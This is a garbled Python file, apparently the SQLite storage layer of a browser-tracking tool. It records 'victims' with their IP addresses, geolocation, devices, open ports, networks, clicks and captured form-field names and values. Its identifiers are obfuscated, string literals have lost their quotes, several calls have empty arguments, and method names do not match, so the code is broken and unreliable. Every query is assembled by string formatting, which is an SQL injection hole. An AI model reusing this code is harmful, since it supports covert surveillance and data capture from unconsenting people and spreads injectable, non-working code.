













class class_0(object):
    def function_0(var_1):     
        var_1.conn = sqlite3.connect(database.db, check_same_thread=False)
        var_1.cursor = var_1.conn.cursor()
        
    def function_1(var_1):
        var_1.cursor.execute()
        var_1.cursor.execute()
        var_1.cursor.execute()
        var_1.cursor.execute()
        var_1.cursor.execute()
        var_1.conn.commit()
        return True

    def function_2(var_1, var_4):
        var_1.cursor.execute(var_4)
        return var_1.cursor.fetchall()

    def function_3(var_1, var_4, var_5):
        var_1.cursor.execute(var_4)
        return var_1.cursor.fetchone()[var_5]

    def function_4(var_1, var_4):
        var_1.cursor.execute(var_4)
        var_1.conn.commit()
        return True

    def function_5(var_1, var_6, vId = None):
        return {
            get_data : SELECT victims.*, geo.*, victims.ip AS ip_local, COUNT(clicks.id) FROM victims INNER JOIN geo ON victims.id = geo.id LEFT JOIN clicks ON clicks.id = victims.id GROUP BY victims.id ORDER BY victims.time DESC,
            var_8 : SELECT networks.* FROM networks ORDER BY id,
            get_preview : SELECT victims.*, geo.*, victims.ip AS ip_local FROM victims INNER JOIN geo ON victims.id = geo.id WHERE victims.id = '%s' % (vId),
            var_9 : SELECT networks.* FROM networks WHERE id = '%s' % (vId),
            var_10 : SELECT requests.*, geo.ip FROM requests INNER JOIN geo on geo.id = requests.user_id ORDER BY requests.date DESC, requests.id ,
            var_11 : SELECT COUNT(*) AS Total FROM networks,
            get_clicks : SELECT COUNT(*) AS Total FROM clicks,
            get_online : SELECT COUNT(*) AS Total FROM victims WHERE status = 'online'
        }.get(var_6, False)

    def function_6(var_1, var_6, vId = None):
        return var_1.sql_execute(var_1.prop_sentences_stats(var_6, vId))

    def function_7(var_1, var_6, data = None):
        if var_6 == count_victim:
            return SELECT COUNT(*) AS C FROM victims WHERE id = '%s' % (data)
        elif type == count_times:
            return SELECT COUNT(*) AS C FROM clicks WHERE id = '%s' % (data)
        elif type == update_victim:
            return UPDATE victims SET ip = '%s', date = '%s', bVersion = '%s', browser = '%s', device = '%s', ports = '%s', time = '%s', cpu = '%s', status = '%s' WHERE id = '%s' % (data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, online, data[1])
        elif type == update_victim_geo:
            return UPDATE geo SET city = '%s', country_code = '%s', country_name = '%s', ip = '%s', latitude = '%s', longitude = '%s', metro_code = '%s', region_code = '%s', region_name = '%s', time_zone = '%s', zip_code = '%s', isp = '%s', ua='%s' WHERE id = '%s' % (data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua, data[1])
        elif type == insert_victim:
            return INSERT INTO victims(id, ip, date, bVersion, browser, device, ports, time, cpu, status) VALUES('%s','%s', '%s','%s', '%s','%s', '%s', '%s', '%s', '%s') % (data[1], data[0].ip, data[0].date, data[0].version, data[0].browser, data[0].device, data[0].ports, data[2], data[0].cpu, online)
        elif type == insert_victim_geo:
            return INSERT INTO geo(id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')  % (data[1], data[0].city, data[0].country_code, data[0].country_name, data[0].ip, data[0].latitude, data[0].longitude, data[0].metro_code, data[0].region_code, data[0].region_name, data[0].time_zone, data[0].zip_code, data[0].isp, data[0].ua)
        elif type == count_victim_network:
            return SELECT COUNT(*) AS C FROM networks WHERE id = '%s' AND network = '%s' % (data[0], data[1])
        elif type == delete_networks:
            return DELETE FROM networks WHERE id = '%s' % (data[0])
        elif type == update_network:
            return UPDATE networks SET date = '%s' WHERE id = '%s' AND network = '%s' % (data[2], data[0], data[1])
        elif type == insert_networks:
            return INSERT INTO networks(id, public_ip, ip, network, date) VALUES('%s','%s', '%s', '%s','%s') % (data[0], data[1], data[2], data[3], data[4])
        elif type == insert_requests:
            return INSERT INTO requests(id, user_id, site, fid, name, value, date) VALUES('%s', '%s','%s', '%s', '%s','%s', '%s') % (data[0].sId, data[0].id, data[0].site, data[0].fid, data[0].name, data[0].value, data[1])
        elif type == insert_click:
            return INSERT INTO clicks(id, site, date) VALUES('%s', '%s','%s') % (data[0], data[1], data[2])
        elif type == report_online:
            return UPDATE victims SET status = '%s' WHERE id = '%s' % (online, data[0])
        elif type == clean_online:
            return UPDATE victims SET status = 'offline' 
        elif var_6 == disconnect_victim:
            return UPDATE victims SET status = '%s' WHERE id = '%s' % (offline, data)
        else:
            return False

    def function_8(var_1, var_6, data = None, sRun = 1, var_5 = 0):
        if sRun == 2:
            return var_1.sql_insert(var_1.prop_sentences_victim(var_6, data))
        elif sRun == 3:
            return var_1.sql_one_row(var_1.prop_sentences_victim(var_6, data), var_5)
        else:
            return var_1.sql_execute(var_1.prop_sentences_victim(var_6, data))

    def function_9(var_1):
        var_1.conn.close()